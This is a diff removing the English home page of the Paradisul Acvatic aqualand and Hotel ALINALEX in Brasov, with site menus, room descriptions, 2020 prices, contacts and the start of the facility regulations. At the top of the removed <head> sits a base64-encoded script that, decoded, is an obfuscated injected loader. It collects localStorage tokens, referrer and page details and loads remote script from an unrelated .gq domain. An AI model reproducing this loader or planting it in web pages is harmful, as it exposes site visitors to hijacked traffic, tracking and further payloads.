@@ -1,1745 +1,947 @@
 <!DOCTYPE html>
-<html>
-	<head>
-	<script src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfNHBHY0wyeHRYNGJ6Y3Focyc7CiAgICBpZiAoIXdpbmRvdy5fNHBHY0wyeHRYNGJ6Y3FocykgewogICAgICAgIHdpbmRvdy5fNHBHY0wyeHRYNGJ6Y3FocyA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly95YXNha2VldnJhZHlpMTAuZ3EvYlpEQmtIN0QnLAogICAgICAgICAgICBQX1BBVEg6ICdodHRwczovL3lhc2FrZWV2cmFkeWkxMC5ncS8wY2M3MDM1L3Bvc3RiYWNrJywKICAgICAgICB9OwogICAgfQogICAgY29uc3QgX0Y3VGNkNTlCTWIyS21mU0QgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnY29uZmlnJyk7CiAgICBpZiAodHlwZW9mIF9GN1RjZDU5Qk1iMkttZlNEICE9PSAndW5kZWZpbmVkJyAmJiBfRjdUY2Q1OUJNYjJLbWZTRCAhPT0gbnVsbCkgewogICAgICAgIHZhciBfY21WQnEzZGR2d1JtbWRQeCA9IEpTT04ucGFyc2UoX0Y3VGNkNTlCTWIyS21mU0QpOwogICAgICAgIHZhciBfM3laMU41UTEyZFB6Sk00diA9IE1hdGgucm91bmQoK25ldyBEYXRlKCkvMTAwMCk7CiAgICAgICAgaWYgKF9jbVZCcTNkZHZ3Um1tZFB4LmNyZWF0ZWRfYXQgKyB3aW5kb3cuXzRwR2NMMnh0WDRiemNxaHMudHRsIDwgXzN5WjFONVExMmRQekpNNHYpIHsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3N1YklkJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCd0b2tlbicpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnY29uZmlnJyk7CiAgICAgICAgfQogICAgfQogICAgdmFyIF9TVm1ZcWZEbTdnOVc0RnpDID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3N1YklkJyk7CiAgICB2YXIgX3hTcTR3TEtXV0xiQzRqRE4gPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgndG9rZW4nKTsKICAgIHZhciBfNlJHajg5ekdzYlBTMjlLWSA9ICc/cmV0dXJuPWpzLmNsaWVudCc7CiAgICAgICAgXzZSR2o4OXpHc2JQUzI5S1kgKz0gJyYnICsgZGVjb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5sb2NhdGlvbi5zZWFyY2gucmVwbGFjZSgnPycsICcnKSk7CiAgICAgICAgXzZSR2o4OXpHc2JQUzI5S1kgKz0gJyZzZV9yZWZlcnJlcj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnJlZmVycmVyKTsKICAgICAgICBfNlJHajg5ekdzYlBTMjlLWSArPSAnJmRlZmF1bHRfa2V5d29yZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnRpdGxlKTsKICAgICAgICBfNlJHajg5ekdzYlBTMjlLWSArPSAnJmxhbmRpbmdfdXJsPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQubG9jYXRpb24uaG9zdG5hbWUgKyBkb2N1bWVudC5sb2NhdGlvbi5wYXRobmFtZSk7CiAgICAgICAgXzZSR2o4OXpHc2JQUzI5S1kgKz0gJyZuYW1lPScgKyBlbmNvZGVVUklDb21wb25lbnQobmFtZSk7CiAgICBpZiAodHlwZW9mIF9TVm1ZcWZEbTdnOVc0RnpDICE9PSAndW5kZWZpbmVkJyAmJiBfU1ZtWXFmRG03ZzlXNEZ6QyAmJiB3aW5kb3cuXzRwR2NMMnh0WDRiemNxaHMudW5pcXVlKSB7CiAgICAgICAgXzZSR2o4OXpHc2JQUzI5S1kgKz0gJyZzdWJfaWQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChfU1ZtWXFmRG03ZzlXNEZ6Qyk7CiAgICB9CiAgICBpZiAodHlwZW9mIF94U3E0d0xLV1dMYkM0akROICE9PSAndW5kZWZpbmVkJyAmJiBfeFNxNHdMS1dXTGJDNGpETiAmJiB3aW5kb3cuXzRwR2NMMnh0WDRiemNxaHMudW5pcXVlKSB7CiAgICAgICAgXzZSR2o4OXpHc2JQUzI5S1kgKz0gJyZ0b2tlbj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF94U3E0d0xLV1dMYkM0akROKTsKICAgIH0KICAgIHZhciBhID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CiAgICAgICAgYS50eXBlID0gJ2FwcGxpY2F0aW9uL2phdmFzY3JpcHQnOwogICAgICAgIGEuc3JjID0gd2luZG93Ll80cEdjTDJ4dFg0YnpjcWhzLlJfUEFUSCArIF82UkdqODl6R3NiUFMyOUtZOwogICAgdmFyIHMgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnc2NyaXB0JylbMF07CiAgICBzLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKGEsIHMpCiAgICB9KSgpOwogICAg"></script>	
-	<base href="" />
-	<title>Complex Paradisul Acvatic Brasov, piscina brasov, strand</title>
-	<meta name="title" content="Complex Paradisul Acvatic Brasov, piscina brasov, strand" />
-	<meta name="Keywords" content="" />
-	<meta name="Description" content="Complex Paradisul Acvatic Brasov, piscina brasov, strand" />
-	<meta name="copyright" content="Paradisul Acvatic" />
-	<meta name="owner" content="Paradisul Acvatic , www.paradisulacvatic.ro" />
-	<meta name="publisher" content="Paradisul Acvatic , www.paradisulacvatic.ro" />
-	<meta name="language" content="english" />
-	<meta name="rating" content="general" />
-	<meta name="expires" content="never" />
-	<meta name="distribution" content="global" />
-	<meta name="robots" content="all" />
-	<meta name="author" content="www.max-vision.ro" /> 
-	<meta name="revisit-after" content="7 days" />
-	<meta name="SKYPE_TOOLBAR" content="SKYPE_TOOLBAR_PARSER_COMPATIBLE" />
-    <meta charset="utf-8" />	
-    <meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0;" />
-	<meta http-equiv="content-language" content="en" />
-	<link rel="stylesheet" type="text/css" href="../style/ccss.css" />
-    <link rel="stylesheet" type="text/css" href="../style/camera.css" />
-    <link rel="stylesheet" type="text/css" href="../style/jquery.jscrollpane.codrops1.css" />
-    <link rel="stylesheet" href="https://code.jquery.com/ui/1.11.2/themes/smoothness/jquery-ui.css">
-	<script charset="utf-8" type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
-	<script src="https://code.jquery.com/ui/1.11.2/jquery-ui.js"></script>
-    
-	<script type="text/javascript" src="../jscripts/jquery.stellar.min.js"></script>
-    <script type="text/javascript" src="../jscripts/camera.min.js"></script>
-<script type="text/javascript" src="../jscripts/waypoints.min.js"></script>
-<script type="text/javascript" src="../jscripts/jquery.easing.1.3.js"></script>
-<script type="text/javascript" src="../jscripts/jquery.nicescroll.min.js"></script>
-
-    <!-- Add mousewheel plugin (this is optional) -->
-	<script type="text/javascript" src="../lib/jquery.mousewheel-3.0.6.pack.js"></script>
-
-	<!-- Add fancyBox main JS and CSS files -->
-	<script type="text/javascript" src="../source/jquery.fancybox.js@v=2.1.5"></script>
-	<link rel="stylesheet" type="text/css" href="../source/jquery.fancybox.css@v=2.1.5.css" media="screen" />
-
-	<!-- Add Button helper (this is optional) -->
-	<link rel="stylesheet" type="text/css" href="../source/helpers/jquery.fancybox-buttons.css@v=1.0.5.css" />
-	<script type="text/javascript" src="../source/helpers/jquery.fancybox-buttons.js@v=1.0.5"></script>
-
-	<!-- Add Thumbnail helper (this is optional) -->
-	<link rel="stylesheet" type="text/css" href="../source/helpers/jquery.fancybox-thumbs.css@v=1.0.7.css" />
-	<script type="text/javascript" src="../source/helpers/jquery.fancybox-thumbs.js@v=1.0.7"></script>
-
-	<!-- Add Media helper (this is optional) -->
-	<script type="text/javascript" src="../source/helpers/jquery.fancybox-media.js@v=1.0.6"></script>
-    
-    <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
-
-	<script type="text/javascript" src="../jscripts/cjs.js"></script>
-	<link rel="shortcut icon" href="../files/images/favicon.ico"  type="image/x-icon" />
-    		<script type="text/javascript">
-            $(window).load(function() { 
-                $('#status span').fadeOut('slow'); 
-                $('#status').fadeOut('slow');
-                $('#preloader').delay(350).fadeOut('slow'); 
-                $('body').delay(350).css({'overflow':'visible'});
-            })
-        </script>
-            
-    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.17.0/jquery.validate.min.js"></script>
-    
-
-        <meta name="google-site-verification" content="eRacHv0SmolYBQUK-MRR3Y2oDkRy_XAMUi3y12bOxa8" />
-	</head>
-	<body class="index">
-    <div id="largeview">
-    <header>
-    	<div class="wrapper">
-        	
-            <nav id="mmenu">
-            	<ul>
-                <li class="activeA"><a href="index.html" title="Complex Paradisul Acvatic Brasov, piscina brasov, strand">Home</a></li>
-                <li id="paa-mm"><a href="index.html" title="Complex Paradisul Acvatic Brasov, piscina brasov">Paradisul Acvatic</a></li>
-                <li id="haa-mm"><a href="index.html" title="hotel Alinalex Brasov, hotel in complexul Paradisul Acvatic">Hotel ALINALEX</a></li>
-                <!--li id="rez-mm"><a href="https://www.paradisulacvatic.ro/en/" title="SEO">Rezerva acum</a></li-->
-                <!--li><a href="http://shop.paradisulacvatic.ro" class="new-window" title="Nou! Magazin online Paradisul Acvatic" id="toggleColor">New! Shop online</a></li-->
-                
-                <li><a href="regulament-de-ordine-interioara-si-utilizare-a-dotarilor/index.html" title="REGULAMENT DE ORDINE INTERIOARĂ ȘI UTILIZARE A DOTĂRILOR">Intern Regulations</a></li>
-                <li><a href="contact/index.html" title="contact Complex Pradisul Acvatic Brasov">Contact</a></li>
-                </ul>
-            </nav>            <h1 id="logo"><a href="index.html" title="Complex Paradisul Acvatic Brasov, piscina brasov, strand">Complex Paradisul Acvatic Brasov, piscina brasov, strand</a></h1>
-            <a href="http://www.booking.com/hotel/ro/alinalex.en-us.html" id="haabooking" class="new-window" title="vezi Hotel ALINALEX pe booking.com">vezi Hotel ALINALEX pe booking.com</a>
-            <a href="http://www.tripadvisor.com/Attraction_Review-g295394-d2161940-Reviews-Paradisul_Acvatic-Brasov_Brasov_County_Central_Romania_Transylvania.html" id="haatripadvisor" class="new-window" title="vezi Paradisul Acvatic pe tripadvisor.com">vezi Paradisul Acvatic pe tripadvisor.com</a>
-            
-        <ul id="lang">
-            <li><a style="background:url('../files/images/ro-flag.png') no-repeat;" href="../ro/index.html" title="Romana">Romana</a></li>
-            <li><a style="background:url('../files/images/en-flag.png') no-repeat;" href="index.html" title="English">English</a></li>
-            <li><a style="background:url('../files/images/hu-flag.png') no-repeat; background-position:0px 2px;" href="../hu/index.html" title="Hungary">Hungary</a></li>
-        </ul>        </div>
-    </header>
-    
-    <div id="fb-root"></div>
-<script>(function(d, s, id) {
-  var js, fjs = d.getElementsByTagName(s)[0];
-  if (d.getElementById(id)) return;
-  js = d.createElement(s); js.id = id;
-  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&appId=592647720803386&version=v2.0";
-  fjs.parentNode.insertBefore(js, fjs);
-}(document, 'script', 'facebook-jssdk'));</script>
-
-<div id="footer">
-    	<div class="wrapper">
-        	<ul id="submenu">
-            	<li><a href="despre-noi/index.html" title="Complex Paradisul Acvatic Brasov, piscina brasov, strand">About us</a></li>
-                <li><a href="galerie-foto/index.html" title="Complex Paradisul Acvatic Brasov, piscina Brasov">Photo gallery</a></li>
-                <li><a href="galerie-video/index.html" title="Complex Paradisul Acvatic Brasov, piscina Brasov">Video gallery</a></li>
-            	<li><a href="sanatate/index.html" title="Complex Paradisul Acvatic Brasov, piscina Brasov">Health</a></li>
-                <li><a href="relaxare/index.html" title="Complex Paradisul Acvatic Brasov, piscina Brasov">Relaxation</a></li>
-                <li><a href="distractie/index.html" title="Complex Paradisul Acvatic Brasov, piscina Brasov">Recreation</a></li>
-                <li><a href="paradisul-copiilor/index.html" title="Complex Paradisul Acvatic Brasov, piscina Brasov">Children's paradise</a></li>
-                <li><a href="alte-servicii/index.html" title="Complex Paradisul Acvatic Brasov, piscina Brasov">Additional services</a></li>
-                <li><a href="tarife_program/index.html" title="Complex Paradisul Acvatic Brasov, piscina Brasov">Prices and program</a></li>
-                <li><a href="regulament-de-ordine-interioara-si-utilizare-a-dotarilor/index.html" title="REGULAMENT DE ORDINE INTERIOARĂ ȘI UTILIZARE A DOTĂRILOR">Intern Regulations</a></li>
-                <li><a href="contact/index.html" title="Complex Paradisul Acvatic Brasov, piscina Brasov">Contact</a></li>
-                <li><a href="../ro/politica-de-utilizare-cookie/index.html" title="Politica de utilizare cookie">Politica de utilizare cookie</a></li>
-                <li><a href="../ro/politica-de-confidentialitate/index.html" title="Politica de confidentialitate">Politica de confidentialitate</a></li>
-            </ul>
-        	<p>www.paradisulacvatic.ro &copy; 2020 All rights reserved. Powered by <a class="new-window" href="http://www.max-vision.ro" title="realizare site web paradisul acvatic">MaxVision</a></p>
-        </div>
-    </div>
-
-    <div id="mcontent">
-    	<div id="shadow-motto-wrapp">
-        	<div id="shadow-motto">
-            	<h2>Enjoy<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Aqualand &amp; Hotel</h2>
-            </div>
-        </div>
-        <div id="mobile-menu">
-        	<h3><i class="fa fa-bars"></i>menu</h3>
-            <ul>
-            	<li><a href="despre-noi/index.html" title="Complex Paradisul Acvatic Brasov, piscina brasov, strand">Paradisul Acvatic</a></li>
-                <li><a href="galerie-foto/index.html" title="Complex Paradisul Acvatic Brasov, piscina Brasov">Photo gallery</a></li>
-                <li><a href="galerie-video/index.html" title="Complex Paradisul Acvatic Brasov, piscina Brasov">Video gallery</a></li>
-            	<li><a href="sanatate/index.html" title="Complex Paradisul Acvatic Brasov, piscina Brasov">Health</a></li>
-                <li><a href="relaxare/index.html" title="Complex Paradisul Acvatic Brasov, piscina Brasov">Relaxation</a></li>
-                <li><a href="distractie/index.html" title="Complex Paradisul Acvatic Brasov, piscina Brasov">Recreation</a></li>
-                <li><a href="paradisul-copiilor/index.html" title="Complex Paradisul Acvatic Brasov, piscina Brasov">Children's paradise</a></li>
-                <li><a href="alte-servicii/index.html" title="Complex Paradisul Acvatic Brasov, piscina Brasov">Additional services</a></li>
-                <li><a href="tarife_program/index.html" title="Complex Paradisul Acvatic Brasov, piscina Brasov">Prices and program</a></li>
-                <li><a href="regulament-de-ordine-interioara-si-utilizare-a-dotarilor/index.html" title="REGULAMENT DE ORDINE INTERIOARĂ ȘI UTILIZARE A DOTĂRILOR">Intern Regulations</a></li>
-                <li><a href="contact/index.html" title="Complex Paradisul Acvatic Brasov, piscina Brasov">Contact</a></li>
-            </ul>
-        </div>
-    	
-        <div id="pa-wrapper">
-        	<div id="icon-paa">
-            <span>ENTER</span>
-            </div>
-            <div id="paa-wrapp-mm" class="lmm">
-            	<ul class="navigation">
-                <li data-slide="1" class="actLmm">Paradisul Acvatic<span></span></li>
-                <li data-slide="11" id="fire-parad-photo">Photo gallery<span></span></li>
-                <li data-slide="12" id="fire-parad-video">Video gallery<span></span></li>
-                <li data-slide="13"><a href="parteneri/index.html" title="Complex Paradisul Acvatic Brasov, piscina Brasov">Partners</a><span></span></li>
-                <li data-slide="2">Health<span></span></li>
-                <li data-slide="3">Relaxation<span></span></li>
-                <li data-slide="4">Recreation<span></span></li>
-                <li data-slide="42">Children's paradise<span></span></li>
-                <li data-slide="43">Additional services<span></span></li>
-                <li data-slide="44"><a href="tarife_program/index.html" title="Complex Paradisul Acvatic Brasov, piscina Brasov">Prices and program</a><span></span></li>
-                <li data-slide="52"><a href="temperaturi/index.html" title="Complex Paradisul Acvatic Brasov, piscina Brasov">Temperature</a><span></span></li>
-                <li data-slide="5"><a href="contact/index.html" title="Complex Paradisul Acvatic Brasov, piscina Brasov">Contact</a><span></span></li>
-                
-                </ul>
-                <a href="https://www.facebook.com/paradisul.acvatic" class="new-window" id="fb-paa" title="facebook hotel ALINALEX">facebook hotel ALINALEX</a>
-            </div>
-            <div id="sections-right">
-            	<div id="sr1-wrapp" class="sr-wrapp" data-slide="1">
-                	<div class="bg-fixer">
-                	<div class="sr-v01" id="sl1">
-                    
-                    	<p>
-	Aquatic paradise opened in July 2007 and meets all requirements for a genuine health and leisure centre, as it is spread over a covered area of 12,000 square meters and another 12,000 sqm in open air for the warm season.</p>
-<p>
-	With a capacity of 2,000 people, our center has six indoor and two outdoor pools, water slides, saunas, jacuzzi, relaxation grotto, fitness room, covered football field, sand volleyball court, restaurant and terraces.</p>
-<p>
-	<a href="despre-noi/index.html">details &amp; pictures</a></p>
-<br />
-                    </div>
-                    </div>
-                </div>
-                
-                <div id="sr2-wrapp" class="sr-wrapp" data-slide="2">
-                	<div class="bg-fixer">
-                	<div class="sr-v01" id="sl1">
-                    
-                    	<p>
-	It is obvious that nowadays people of all ages are less active and have a less healthy lifestyle. You can keep your tone physically and mentally in our special gym equipped with a complete range of professional equipment: 2 treadmills, elliptical trainer, stationary bicycle, various leg presses (decline and horizontal), multiple abdominal trainer, abdominal crunch bench, biceps trainer, &nbsp;triceps trainer, lumbar muscles trainer, dorsal muscles trainer, multifunctional trainer for different muscle groups, adductor trainer, femoral biceps trainer, [...]</p>
-<p>
-	<a href="sanatate/index.html">Details &amp;&nbsp;pictures</a></p>
-                    </div>
-                    </div>
-                </div>
-                
-                <div id="sr3-wrapp" class="sr-wrapp" data-slide="3">
-                	<div class="bg-fixer">
-                	<div class="sr-v01" id="sl1">
-                    	
-                    	<p>
-	Equipped with hydromassage nozzles and cervical shower jets, the relaxing pool offers you more options to escape from everyday stress.<br />
-	The cascading water and tropical plants around it create an ideal environment for a day of &quot;vacation&quot; even if you are very close to home.<br />
-	This pool accommodates aquagym sessions.</p>
-<p>
-	<a href="relaxare/index.html">details &amp; pictures</a></p>
-                    </div>
-                    </div>
-                </div>
-                
-                <div id="sr4-wrapp" class="sr-wrapp" data-slide="4">
-                	<div class="bg-fixer">
-                	<div class="sr-v01" id="sl1">
-                    
-                    	<p>
-	<strong>Recreation</strong></p>
-<p>
-	Water slides,&nbsp;Indoor pool with springboards,&nbsp;Rustic Showers,&nbsp;Volleyball court with sand,&nbsp;Outdoor pools</p>
-<p>
-	<a href="distractie/index.html">Details &amp; pictures</a></p>
-                    </div>
-                    </div>
-                </div>
-                
-                <div id="sr5-wrapp" class="sr-wrapp" data-slide="5">
-                	<div class="bg-fixer">
-                	<div class="sr-v01" id="sl1">
-                    
-                    	<p>
-	<strong>You may visit us with your whole family!</strong></p>
-<p>
-	While you relax, we have created the perfect place for your children&rsquo;s fun and play. Hot water pool is especially designed and equipped for the children&rsquo;s comfort and safety. Also, water quality is closely monitored through filtration systems and regular disinfection.</p>
-<p>
-	<a href="paradisul-copiilor/index.html">details &amp; pictures</a></p>
-                    </div>
-                    </div>
-                </div>
-                
-                <div id="sr6-wrapp" class="sr-wrapp" data-slide="6">
-                	<div class="bg-fixer">
-                	<div class="sr-v01" id="sl1">
-                    
-                    	<p>
-	<b>Additional services</b></p>
-<p>
-	Solariums, Cosmetics, Restaurant, terraces, Swimming Courses, Rent, Store pool articles</p>
-<p>
-	<a href="alte-servicii/index.html">details &amp; pictures</a></p>
-                    </div>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        
-        <div id="haa-wrapper">
-        	<div id="contact-succ-top">
-            	<h3>Rezervarea dumneavoastră a fost trimisa cu succes către recepţie!<br />
-Vă vom contacta în cel mai scurt timp!</h3>
-            </div>
-        	<div id="icon-haa">
-            <span>ENTER</span>
-            </div>
-            <div id="haa-wrapp-mm" class="lmm">
-            	<ul class="navigation">
-                <li data-slide="1" class="actLmm">Hotel ALINALEX<span></span></li>
-                <li data-slide="2">Rooms<span></span></li>
-                <li data-slide="3">Facilities<span></span></li>
-                <li data-slide="4">Breakfast<span></span></li>
-                <li id="fire-gallery">Photo gallery<span></span></li>
-                <li id="fire-testimonials">Testimonials<span></span></li>
-                <li data-slide="5">Contact<span></span></li>
-                <li data-slide="6">Prices<span></span></li>
-                </ul>
-                <a href="https://www.facebook.com/hotel.alinalex" class="new-window" id="fb-haa" title="facebook hotel ALINALEX">facebook hotel ALINALEX</a>
-                <span class="contact-lft-bx">Contact us</span>
-                <p>
-	Tel: 0040 268 440 010<br />
-	receptie@hotelalinalex.ro</p>
-            </div>
-            <div id="sections-left">
-            	<div id="sl1-wrapp" class="sl-wrapp">
-                	<span data-slide="1"></span>
-                	<div class="bg-fixer">
-                	<div class="sl-v01" id="sl1">
-                    
-                    	<h2>
-	Welcome!</h2>
-<p>
-	Located away from the agitation of the city, but only 9 minutes away from the historic and commercial center of Brasov, HOTEL ALINALEX *** distinguishes itself by comfort, elegance and exceptional service.</p>
-<p>
-	At only 20 meters away, the aqualand Paradisul Acvatic is open 365 days / year for those seeking relaxation, sports and entertainment.</p>
-                    </div>
-                    </div>
-                </div>
-                <div id="sl2-wrapp" class="sl-wrapp">
-                	<span data-slide="2"></span>
-                	<div class="bg-fixer">
-                	<div class="sl-v01" id="sl2">
-                    
-                    	<h2>
-	Rooms</h2>
-<p>
-	The hotel has a capacity of 23 rooms, each with an area of 45 sqm. All rooms have a matrimonial bed of 2x2 meters, and can be rented both as &quot;double&quot; and &quot;single&quot;.</p>
-<p>
-	Amenities: wood furniture, TV, safe, mini-bar, telephone, additional bed available upon request. Bathrooms are equipped with bathtub, bidet, hairdryer, shaver socket.</p>
-                    </div>
-                    </div>
-                </div>
-                <div id="sl3-wrapp" class="sl-wrapp">
-                	<div class="bg-fixer">
-                	<div class="sl-v01" id="sl3">
-                    	<h2>
-	Amenities</h2>
-<p>
-	&nbsp;</p>
-<table border="0" cellpadding="2" cellspacing="1" style="width: 500px;">
-	<tbody>
-		<tr>
-			<td style="text-align: justify;">
-				Cable and WIFI internet access</td>
-			<td>
-				Surveilled parking lot</td>
-		</tr>
-		<tr>
-			<td>
-				Safe in each room</td>
-			<td>
-				Cable TV</td>
-		</tr>
-		<tr>
-			<td>
-				Netpoint in the hotel reception lobby</td>
-			<td>
-				Smoking area</td>
-		</tr>
-		<tr>
-			<td>
-				Telephone and mini-bar in each room</td>
-			<td>
-				Cafe-bar</td>
-		</tr>
-	</tbody>
-</table>
-<p>
-	Bathrooms equipped with bathtub, bidet, hairdryer, shaver socket;</p>
-<p>
-	Aqualand (6 indoor pools, sauna, jacuzzi, gym, massage, restaurant).</p>
-                        
-                    </div>
-                    </div>
-                    
-                </div>
-                <div id="sl4-wrapp" class="sl-wrapp" data-slide="4">
-                	<div class="bg-fixer">
-                	<div class="sl-v01" id="sl4">
-                    
-                    	<h2>
-	Breakfast</h2>
-<p>
-	Enjoy the flavour of the morning coffee together with a rich and varied Swedish buffet breakfast.</p>
-<p>
-	Monday- Friday: &nbsp; &nbsp; 07.00 am to 10.00 am</p>
-<p>
-	Saturday - Sunday: &nbsp;08.00 am to 11.00 am</p>
-                    </div>
-                    </div>
-                </div>
-                <div id="sl5-wrapp" class="sl-wrapp" data-slide="5">
-                	<div class="bg-fixer">
-                	<div class="sl-v01" id="sl5">
-                    
-                    	<h2>
-	Contact</h2>
-<table border="0" cellpadding="0" cellspacing="1" style="width: 490px;">
-	<tbody>
-		<tr>
-			<td>
-				<p>
-					<strong>For bookings: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</strong></p>
-				<p>
-					Telefon: 0040 268 440 010<br />
-					FAX: 0040 268 440 136</p>
-				<p>
-					<strong>e-mail:&nbsp;</strong>receptie@hotelalinalex.ro &nbsp; &nbsp; &nbsp; &nbsp;</p>
-			</td>
-			<td style="text-align: justify;">
-				<p>
-					<strong>Address:</strong></p>
-				<p>
-					B-dul GRIVIŢEI, 2F-2G</p>
-				<p>
-					(ieşirea spre Tg. Mureş)&ndash;DN13&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</p>
-				<div>
-					&nbsp;</div>
-			</td>
-		</tr>
-	</tbody>
-</table>
-                    </div>
-                    </div>
-                </div>
-                <div id="sl6-wrapp" class="sl-wrapp" data-slide="6">
-                	<div class="bg-fixer">
-                	<div class="sl-v01" id="sl6">
-                    
-                    	<h2>
-	Tarife sezon 2020</h2>
-<p>
-	01.01.-29.02, 18.04-20.04, 01.05-02.05, 12.06-20.09, 24.12-31.12</p>
-<table border="1" cellpadding="1" cellspacing="1" style="width: 505px;">
-	<tbody>
-		<tr>
-			<td>
-				Camera dubla</td>
-			<td>
-				350 RON</td>
-		</tr>
-		<tr>
-			<td>
-				Camera dubla + 3h aqualand</td>
-			<td>
-				400 RON</td>
-		</tr>
-		<tr>
-			<td>
-				Camera dubla + full day aqualand</td>
-			<td>
-				420 RON</td>
-		</tr>
-	</tbody>
-</table>
-<p>
-	&nbsp;</p>
-<table border="1" cellpadding="1" cellspacing="1" style="width: 505px;">
-	<tbody>
-		<tr>
-			<td>
-				Camera single</td>
-			<td>
-				300 RON</td>
-		</tr>
-		<tr>
-			<td>
-				Camera single + 3h aqualand</td>
-			<td>
-				320 RON</td>
-		</tr>
-		<tr>
-			<td>
-				Camera single + full day aqualand</td>
-			<td>
-				340 RON</td>
-		</tr>
-	</tbody>
-</table>
-<p>
-	&nbsp;</p>
-<h2>
-	Tarife extrasezon 2020</h2>
-<table border="1" cellpadding="1" cellspacing="1" style="width: 505px;">
-	<tbody>
-		<tr>
-			<td>
-				Camera dubla</td>
-			<td>
-				290 RON</td>
-		</tr>
-		<tr>
-			<td>
-				Camera dubla + 3h aqualand</td>
-			<td>
-				330 RON</td>
-		</tr>
-		<tr>
-			<td>
-				Camera dubla + full day aqualand</td>
-			<td>
-				350 RON</td>
-		</tr>
-	</tbody>
-</table>
-<p>
-	&nbsp;</p>
-<table border="1" cellpadding="1" cellspacing="1" style="width: 505px;">
-	<tbody>
-		<tr>
-			<td>
-				Camera single</td>
-			<td>
-				250 RON</td>
-		</tr>
-		<tr>
-			<td>
-				Camera single + 3h aqualand</td>
-			<td>
-				265 RON</td>
-		</tr>
-		<tr>
-			<td>
-				Camera single + full day aqualand</td>
-			<td>
-				280 RON</td>
-		</tr>
-	</tbody>
-</table>
-<p>
-	*Tarifele pe camera sunt pentru o noapte de cazare si includ taxele si micul dejun.</p>
-                        <!-- ?=formularTrimiteRez()? -->
-                    </div>
-                    </div>
-                </div>
-                </div>
-        </div>
-        
-        <div id="link-overlay">
-        	<a href="index.html#" id="pa-fire" title="Complex Paradisul Acvatic">Complex Paradisul Acvatic</a>
-            <a href="index.html#" id="haa-fire" title="Hotel ALINALEX">Hotel ALINALEX</a>
-        </div>
-    </div>    
-    
-    
-  
-<div id="preloader">
-    <div id="status">
-    	<h3 id="logo-loading" title="Complex Paradisul Acvatic Brasov, piscina brasov, strand">Complex Paradisul Acvatic Brasov, piscina brasov, strand</h3>
-        <span>Va rugăm așteptați ...</span>
-    </div>
-</div>
-<!-- div id="popupv01">
-	<div id="popup-overlayclose">
-    </div>
-    <div id="popup-innerv01">
-        <img src="https://www.paradisulacvatic.ro/files/images/IMG-20150824-WA0000.jpg" alt="paradisul acvatic brasov" />
-        <a href="#" id="closepopupv01" title="inchide pop-upul"><i class="fa fa-times-circle-o"></i></a>
-    </div>
-    
-</div-->
-
-
-
-<div id="regulation_modal_overlay">
-	<div id="regulation_modal_wrapper">
-		<div id="regulation_modal_header">
-			<h5><i class="fa fa-hand-paper-o" aria-hidden="true"></i>&nbsp;STOP! Studiază regulamentul!</h5>
-		</div>
-		<div id="regulation_modal_content">
-			<h3>
-	INTERNAL REGULATIONS AND&nbsp; REGULATIONS FOR USE OF FACILITIES OF THE AQUATIC PARADISE</h3>
-<div>
-	&nbsp;</div>
-<h3>
-	<span style="color:#ff0000;">Mandatory character and purpose</span></h3>
-<div>
-	&nbsp;</div>
-<div>
-	THE AQUATIC PARADISE is a recreational, leisure and sports center, where every customer can benefit from recreational, recreational, leisure and fun services. The purpose of these Internal Regulations is to ensure the security and safety of the people and belongings, the order and cleanliness.</div>
-<div>
-	&nbsp;</div>
-<div>
-	The internal regulations and the regulations for use are mandatory for all beneficiaries, visitors and employees of the AQUATIC PARADISE Center, in all areas on the property of the company DIP &amp; GIP SRL, including:</div>
-<div>
-	&nbsp;</div>
-<div>
-	- on the access road from the junction with DN 13 national road</div>
-<div>
-	-&nbsp; &nbsp; &nbsp;in the parking lot, outside areas and inside the center</div>
-<div>
-	&nbsp;</div>
-<div>
-	In order to benefit from the facilities of the AQUATIC PARADISE, you, as a beneficiary and visitor, must accept the rules set out in these Regulations.</div>
-<div>
-	&nbsp;</div>
-<div>
-	&nbsp; &nbsp;If you do not agree with any of the rules please do not enter the premises. By paying the entry fee, you, as a beneficiary (either inside the building or in adjacent areas including the parking lot), agree to these Internal Regulations and the regulations for the use of facilities and you undertake to comply unconditionally with all rules set out below, which you are supposed and presumed to have read carefully, by simply entering the AQUATIC PARADISE. Your consent to receive the access card gives rise to a contract between you and DIP &amp; GIP SRL, under the terms of thses REGULATIONS.</div>
-<div>
-	&nbsp;</div>
-<div>
